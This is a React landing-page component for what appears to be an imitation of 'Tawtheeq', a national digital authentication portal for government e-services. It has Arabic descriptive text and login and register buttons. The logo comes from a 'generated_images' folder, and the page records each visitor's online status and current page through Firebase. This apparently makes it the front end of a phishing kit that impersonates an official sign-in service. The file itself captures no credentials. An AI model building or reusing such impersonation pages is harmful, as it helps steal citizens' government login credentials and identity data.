import React, { useEffect } from "react";
import { Link } from "wouter";
import { Header } from "@/components/Header";
import { Footer } from "@/components/Footer";
import { Button } from "@/components/ui/button";
import logo from "@assets/generated_images/logo_for_tawtheeq_national_authentication_system.png";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { setOnlineStatus, updateOnlinePage } from "@/lib/firebase";

export default function Landing() {
  useVisitorTracking("/");
  
  useEffect(() => {
    const cleanup = setOnlineStatus();
    updateOnlinePage("/");
    return cleanup;
  }, []);
  
  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl">
      <Header />
      
      <main className="flex-1 container mx-auto px-4 py-12 flex justify-center items-center">
        <div className="w-full max-w-2xl bg-gray-200/50 p-8 rounded-lg shadow-sm border border-gray-200/50">
          <div className="flex justify-center mb-6">
             <img src={logo} alt="Logo" className="h-20 w-20 object-contain" />
          </div>
          
          <p className="text-gray-800 text-center leading-loose text-lg mb-12">
            تهدف خدمة التوثيق الوطني إلى التحقق من الهوية الرقمية للأفراد والشركات من مستخدمي الخدمات الحكومية الإلكترونية المتاحة على شبكة الإنترنت، بالإضافة إلى تفعيل ميزة الدخول الموحد للخدمات الإلكترونية من خلال إنشاء كلمة سر واسم مستخدم واحد فقط.
            <br />
            ويمكن للفرد أن يستخدم حسابه المُنشأ على نظام التوثيق الوطني "توثيق" لإجراء أي من المعاملات الإلكترونية التي توفرها الجهات الحكومية المستخدمة للنظام. وبذلك، يشكل نظام "توثيق" عنصراً أساسياً في تسهيل وتطوير وتأمين الخدمات الإلكترونية.
          </p>

          <div className="space-y-4 max-w-md mx-auto">
            <Link href="/login">
              <Button className="w-full bg-[#2b7bc4] hover:bg-[#2368a8] text-white h-14 text-xl font-bold rounded-md shadow-sm">
                تسجيل الدخول
              </Button>
            </Link>
            
            <Link href="/register">
              <Button className="w-full bg-[#e6e6e6] hover:bg-[#d9d9d9] text-gray-800 border border-black h-14 text-xl font-bold rounded-md shadow-sm">
                تسجيل مستخدم جديد
              </Button>
            </Link>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
